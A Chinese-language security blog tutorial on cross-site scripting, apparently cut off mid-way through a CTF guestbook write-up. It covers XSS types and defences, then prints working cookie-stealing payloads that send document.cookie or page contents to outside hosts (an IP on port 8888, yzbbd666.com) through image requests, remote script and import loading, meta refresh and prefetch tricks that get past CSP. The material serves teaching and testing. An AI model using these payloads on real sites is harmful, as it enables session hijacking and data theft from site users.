<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>浅析XSS漏洞 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>浅析XSS漏洞</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-08-07T01:16:40.250Z" id="date"> 2023-08-07</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-08-07T01:28:42.764Z" id="updated"> 2023-08-07</time></div></span><br><span>Word Count: <div class="control">5.4k</div></span><br><span>Read Time: <div class="control">22 min</div></span></div></div><hr><div id="post-content"><h1>XSS注入总结</h1>
<h3 id="一、XSS漏洞原理"><a href="#一、XSS漏洞原理" class="headerlink" title="一、XSS漏洞原理"></a>一、XSS漏洞原理</h3>
<p>XSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。</p>
<p>当应用程序没有对用户提交的内容进行验证和重新编码，而是直接呈现给网站的访问者时，就可能会触发XSS攻击。</p>
<h3 id="二、XSS漏洞的危害"><a href="#二、XSS漏洞的危害" class="headerlink" title="二、XSS漏洞的危害"></a>二、XSS漏洞的危害</h3>
<p>（1）窃取管理员帐号或Cookie。入侵者可以冒充管理员的身份登录后台，使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。<br>
（2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。<br>
（3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。<br>
（4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。</p>
<h3 id="三、XSS漏洞的分类"><a href="#三、XSS漏洞的分类" class="headerlink" title="三、XSS漏洞的分类"></a>三、XSS漏洞的分类</h3>
<h4 id="1、反射型XSS"><a href="#1、反射型XSS" class="headerlink" title="1、反射型XSS"></a>1、反射型XSS</h4>
<p><strong>反射型XSS，也称为非持久性XSS，是最常见的一种XSS。</strong></p>
<p>XSS代码常常出现在URL请求中，当用户访问带有XSS代码的URL请求时，服务器端接收请求并处理，然后将带有XSS代码的数据返回给浏览器，浏览器解析该段带有XSS代码的数据并执行，整个过程就像一次反射，故称为反射型XSS。</p>
<p>该类攻击的主要特点是它的及时性和一次性，即用户提交请求后，响应信息会立即反馈给用户。该类攻击常发生在搜索引擎、错误提示页面等对用户的输入做出直接反应的场景中。</p>
<h4 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h4>
<p><strong>存储型XSS，也称为持久性XSS。</strong></p>
<p>在存储型XSS中，XSS代码被存储到服务器端，因此允许用户存储数据到服务器端的Web应用程序可能存在该类型XSS漏洞。攻击者提交一段XSS代码后，服务器接收并存储，当其他用户访问包含该XSS代码的页面时，XSS代码被浏览器解析并执行。</p>
<p>存储型XSS攻击的特点之一是提交的恶意内容会被永久存储，因而一个单独的恶意代码就会使多个用户受害，故被称为持久性XSS，它也是跨站脚本攻击中危害最的一类。二是被存储的用户提交的恶意内容不一定被页面使用，因此存在危险的响应信息不一定被立即返回，也许在访问那些在时间上和空间上没有直接关联的页面时才会引发攻击，因此存在不确定性和更好的隐蔽性。</p>
<p>这类攻击的一个典型场景是留言板、博客和论坛等，当恶意用户在某论坛页面发布含有恶意的Javascript代码的留言时，论坛会将该用户的留言内容保存在数据库或文件中并作为页面内容的一部分显示出来。当其他用户查看该恶意用户的留言时，恶意用户提交的恶意代码就会在用户浏览器中解析并执行。</p>
<h4 id="3、DOM型XSS"><a href="#3、DOM型XSS" class="headerlink" title="3、DOM型XSS"></a>3、DOM型XSS</h4>
<p><strong>DOM (Document Objet Model)指文档对象模型。</strong></p>
<p>DOM常用来表示在HTML和XML中的对象。DOM可以允许程序动态的访问和更新文档的内容、结构等。客户端JavaScript可以访问浏览器的文档对象模型。也就是说，通过JavaScript代码控制DOM节点就可以不经过服务器端的参与重构HTML页面。</p>
<p>该类攻击是反射型XSS的变种。它通常是由于客户端接收到的脚本代码存在逻辑错误或者使用不当导致的。比如Javascript代码不正确地使用各种DOM方法(如document.write)和Javascript内部函数(如eval函数)，动态拼接HTML代码和脚本代码就容易引发DOM型的跨站脚本攻击。</p>
<p>因此，DOM型XSS与前面两种XSS的区别就在于DOM型XSS攻击的代码不需要与服务器端进行交互，DOM型XSS的触发基于浏览器端对DOM数据的解析来完成，也就是完全是客户端的事情。</p>
<h4 id="4、判断是哪一种XSS"><a href="#4、判断是哪一种XSS" class="headerlink" title="4、判断是哪一种XSS"></a>4、判断是哪一种XSS</h4>
<p>发送一次带XSS代码的请求，若只能在当前返回的数据包里发现XSS代码，则是反射型；若以后这个页面的返回包里都会有XSS代码，则是存储型；若在返回包里找不到XSS代码，则是DOM型。</p>
<h3 id="四、XSS漏洞的检测与防御"><a href="#四、XSS漏洞的检测与防御" class="headerlink" title="四、XSS漏洞的检测与防御"></a>四、XSS漏洞的检测与防御</h3>
<h4 id="1、检测"><a href="#1、检测" class="headerlink" title="1、检测"></a>1、检测</h4>
<p><strong>手工检测</strong></p>
<p>手工检测重点要考虑数据输入的地方，且需要清楚输入的数据输出到什么地方。</p>
<p>在检测的开始，可以输入一些敏感字符，比如“&lt;、&gt;、（）”等，提交后查看网页源代码的变化以发现输入被输出到什么地方，且可以发现相关敏感字符是否被过滤。</p>
<p>手工检测结果相对准确，但效率较低。<br>
<strong>工具检测</strong></p>
<p>常用工具有AVWS（Acunetix Web Vulnerability Scanner）、BurpSuite等。还有一些专门针对XSS漏洞的检测工具，如：XSSer、XSSF（跨站脚本攻击框架）、BeEF(The Browser Exploitation Framework)等。</p>
<h4 id="2、防御"><a href="#2、防御" class="headerlink" title="2、防御"></a>2、防御</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">●使用黑名单进行<br><br>●对HTML标签或特殊字符进行过滤<br><br>●使用内容安全的CSP<br><br>●使用设计上就会自动编码的框架，如：OWASP ESAPI、React JS、JSOUP等，对于JAVA而言，可以使用ESAPI.encoder().encodeForHTML()对字符串进行HTML编码。<br><br>●对于反射型和存储型XSS，可以在数据返回给客户端浏览器时，将敏感字符进行转义，如：将单引号进行编码替换（十进制编码&#x27;、十六进制编码&#x27;、HTML编码&amp;apos、Unicode编码\u0027等）。<br><br>●对于DOM型XSS，可以使用上下文敏感数据编码。如：在PHP中的htmlspecialchars（）、htmlentities（）函 数可以将一些预定义的字符转换为HTML实体，如：小于转化为&lt;、大于转化为&gt;、双引号转化为&quot;、单引号转化为&amp;apos、与转化 为&amp;等。<br><br>●启用浏览器的HttpOnly特性可以组织客户端脚本访问cookie。如：在PHP中可以通过下面的代码设置cookie并启用HttpOnly。<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>    Header(&quot;Set-Cookie:password=123456;httponly&quot;,false);<br>&gt;<br></code></pre></td></tr></table></figure>
<p><strong>关键点：</strong><br>
目标网站的目标用户</p>
<ul>
<li>浏览器</li>
<li>不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时<strong>被浏览器解析执行</strong></li>
<li>“跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。</li>
</ul>
<p><strong>总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行</strong></p>
<h1>1.基于存储型的XSS攻击</h1>
<p><strong>上面说了这么多还是不知道xss攻击应该运用在哪些场景下，下面我们把XSS分为有CSP保护和无CSP保护两个场景来实现。</strong></p>
<h2 id="0x01-无CSP保护下的XSS"><a href="#0x01-无CSP保护下的XSS" class="headerlink" title="0x01-无CSP保护下的XSS"></a>0x01 无CSP保护下的XSS</h2>
<h3 id="1-直接嵌入型"><a href="#1-直接嵌入型" class="headerlink" title="1-直接嵌入型"></a>1.直接嵌入型</h3>
<p>当过滤的东西较少时，可以优先考虑这个。这种xss触发方式比较直接，直接嵌入能够xss的js代码，下面看一个例子。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html">//admin访问页面<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();</span><br><span class="language-javascript">img.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;http://45.78.29.252:8888/?a=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;head&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(img);  </span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230328211110610.png'><img src="image-20230328211110610.png" alt="image-20230328211110610"></p>
<p>js代码与图片嵌入head中一起解析，之后将获取的cookie发送至xss平台</p>
<h3 id="2-import导入型"><a href="#2-import导入型" class="headerlink" title="2-import导入型"></a>2.import导入型</h3>
<p>经常用于过滤比较严格的情况，经过实验发现link的属性rel值为import时会将资源请求回来并一同解析，注意必须是完整的资源例如HTML、PHP、JS等。请求的资源必须要设置为允许跨域加载的响应头。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 无csp 远程包含js文件 --&gt;</span>admin访问页面<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>无csp/远程包含js文件/import<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">import</span> <span class="hljs-attr">href</span>=<span class="hljs-string">http://yzbbd666.com/2.php</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>下面是<a target="_blank" rel="noopener" href="http://yzbbd666.com/2.php%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%B3%A8%E6%84%8F%E5%A1%AB%E5%86%99Access-Control-Allow-Origin">http://yzbbd666.com/2.php文件内容注意填写Access-Control-Allow-Origin</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Access-Control-Allow-Origin: *&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;script src=<span class="hljs-string">&quot;https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>$.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>,function(data)&#123;<br><span class="hljs-comment">//alert(data);</span><br>        location.href=<span class="hljs-string">&quot;http://45.78.29.252:8888/?a=&quot;</span>+<span class="hljs-title function_ invoke__">escape</span>(data);<br>&#125;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230328211120983.png'><img src="image-20230328211120983.png" alt="image-20230328211120983"></p>
<p>我们发现访问成功了，link的import会首先将访问的资源执行所以会触发xss漏洞，将盗取的才cookie值发送至服务器</p>
<h3 id="3-script导入型"><a href="#3-script导入型" class="headerlink" title="3-script导入型"></a>3.script导入型</h3>
<p>一般也是输入限制比较多的时候，请求访问可以利用script的远程js加载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//admin访问页面<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;xss&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;script src=http://yzbbd666.com/ld.js&gt;&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://yzbbd666.com/ld.js%E5%86%85%E5%AE%B9%E5%A6%82%E4%B8%8B%EF%BC%8C%E6%B3%A8%E6%84%8F%E8%BF%99%E9%87%8C%E6%98%AFjs%E6%A0%BC%E5%BC%8F">http://yzbbd666.com/ld.js内容如下，注意这里是js格式</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();<br>img.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;http://45.78.29.252:8888/?a=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;head&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(img);  <br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230328211358253.png'><img src="image-20230328211358253.png" alt="image-20230328211358253"></p>
<p>说明script加载并执行了远程js脚本，并将cookie发送至xss平台</p>
<h2 id="0x02-有CSP保护下的XSS"><a href="#0x02-有CSP保护下的XSS" class="headerlink" title="0x02-有CSP保护下的XSS"></a>0x02 有CSP保护下的XSS</h2>
<blockquote>
<p>CSP中文意思是内容安全策略，为了保护文档内容而实施的策略，首先简答介绍一下CSP相关内容，其次讲解一下绕过方法。</p>
</blockquote>
<h3 id="1-内容安全策略"><a href="#1-内容安全策略" class="headerlink" title="1-内容安全策略"></a>1.内容安全策略</h3>
<h4 id="（1）-CSP策略"><a href="#（1）-CSP策略" class="headerlink" title="（1）-CSP策略"></a>（1） CSP策略</h4>
<pre><code>一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样：
Content-Security-Policy: default-src ‘self’ www.baidu.com; script-src ‘unsafe-inline’
其中每一组策略包含一个策略指令和一个内容源列表
</code></pre>
<h4 id="（2）-常用的策略指令"><a href="#（2）-常用的策略指令" class="headerlink" title="（2）-常用的策略指令"></a>（2） 常用的策略指令</h4>
<pre><code>default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：
child-src指定定义了 web workers 以及嵌套的浏览上下文
connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。
font-src定义了字体加载的有效来源
img-src定义了页面中图片和图标的有效来源
media-src针对媒体引入的 HTML 多媒体的加载策略。
object-src插件(比如 Flash)，针对 、 或 等标签引入的 flash 等插件的加载策略。
style-src定义了页面中CSS样式的有效来源
script-src 定义了页面中Javascript的有效来源（外部脚本）
</code></pre>
<h5 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h5>
<p>内容源有三种：源列表、关键字和数据</p>
<pre><code>源列表
源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘‘)，端口号也可以使用通配符 (同样是 ‘‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。
有效的主机表达式包括：
http://*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。）
mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）
https://store.foo.com （匹配所有使用 https协议访问 store.foo.com 的尝试。）
如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。

关键字
‘none’
代表空集；即不匹配任何 URL。两侧单引号是必须的。
‘self’
代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。
‘unsafe-inline’
允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。
‘unsafe-eval’
允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。
Content-Security-Policy: default-src 'self' trustedscripts.foo.com

数据
data:
允许data: URI作为内容来源。
mediastream:
允许mediastream: URI作为内容来源。
Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream:
</code></pre>
<h3 id="2-跳转"><a href="#2-跳转" class="headerlink" title="2-跳转"></a>2.跳转</h3>
<h4 id="meta标签跳转"><a href="#meta标签跳转" class="headerlink" title="meta标签跳转"></a>meta标签跳转</h4>
<blockquote>
<p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//admin访问页面</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Security-Policy: default-src &#x27;none&#x27;;&quot;</span>) ;<span class="hljs-comment">//这里可以设置CSP</span><br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;XSS&lt;/title&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;refresh&quot;</span> content=<span class="hljs-string">&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot;</span> &gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230328212119810.png'><img src="image-20230328212119810.png" alt="image-20230328212119810"></p>
<p>发现图片不能被访问，但meta标签中的内容可以被访问，成功弹至xss平台。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">小tip：如何获取cookie<br>(1)通过document.cookie获取所有的cookie值，获取到一个cookie所有值在一起的字符串。<br><br>(2)因为所有的cookie都是以分号隔开的，所有使用split(‘;’)将这个字符串切开变成数组，存起来。<br><br>(3)判断数组中每一项有没有包含cookie名字的，如果有，把对应的值取出来就行。<br></code></pre></td></tr></table></figure>
<h4 id="script脚本跳转"><a href="#script脚本跳转" class="headerlink" title="script脚本跳转"></a>script脚本跳转</h4>
<blockquote>
<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;http://www.xss.com/x.php?c=[cookie]&quot;</span>;<br>&lt;/script&gt;<br><br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;flag.php&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br></code></pre></td></tr></table></figure>
<h4 id="prefetch预加载绕过"><a href="#prefetch预加载绕过" class="headerlink" title="prefetch预加载绕过"></a>prefetch预加载绕过</h4>
<pre><code>CSP对link标签的预加载功能考虑不完善。
在Chrome下，可以使用如下标签发送cookie
&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;
在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie
&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//[cookie].xxx.ceye.io&quot;&gt;
</code></pre>
<p>实验代码<br>
admin访问界面<br>
注意这里允许里内联脚本，所以理所当然的可以使用跳转的方法获取cookie的值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>) ;<span class="hljs-comment">//这里可以设置CSP</span><br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;XSS&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;script&gt;<br><span class="hljs-keyword">var</span> n0t = document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">&quot;link&quot;</span>);<br>    n0t.<span class="hljs-title function_ invoke__">setAttribute</span>(<span class="hljs-string">&quot;rel&quot;</span>, <span class="hljs-string">&quot;prefetch&quot;</span>);<br>    n0t.<span class="hljs-title function_ invoke__">setAttribute</span>(<span class="hljs-string">&quot;href&quot;</span>, <span class="hljs-string">&quot;http://45.78.29.252:8888/?a=&quot;</span> + <span class="hljs-title function_ invoke__">String</span>(document.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">&quot;html&quot;</span>)[<span class="hljs-number">0</span>].innerHTML).<span class="hljs-title function_ invoke__">substring</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>));<br>    document.head.<span class="hljs-title function_ invoke__">appendChild</span>(n0t);<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230328212941614.png'><img src="image-20230328212941614.png" alt="image-20230328212941614"></p>
<p>成功获取cookie值</p>
<h2 id="0x03-XSS绕过技巧"><a href="#0x03-XSS绕过技巧" class="headerlink" title="0x03-XSS绕过技巧"></a>0x03 XSS绕过技巧</h2>
<p><strong>检索到了一个高级xss绕过备忘录（晦涩难懂）等日后拜读吧</strong></p>
<p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">XSS 过滤器规避 - OWASP 备忘单系列</a></p>
<h2 id="0x04-实例解析"><a href="#0x04-实例解析" class="headerlink" title="0x04-实例解析"></a>0x04 实例解析</h2>
<p>这一部分呢将作为长期更新的地方如果遇到好的xss题目可以联系我，将一些不错的xss题目总结在这里，为的是把理论知识与实践相结合</p>
<h3 id="0x1-htcf-guestbook"><a href="#0x1-htcf-guestbook" class="headerlink" title="0x1-htcf-guestbook"></a>0x1 htcf guestbook</h3>
<p>从代码中我们可以看到基本的过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span 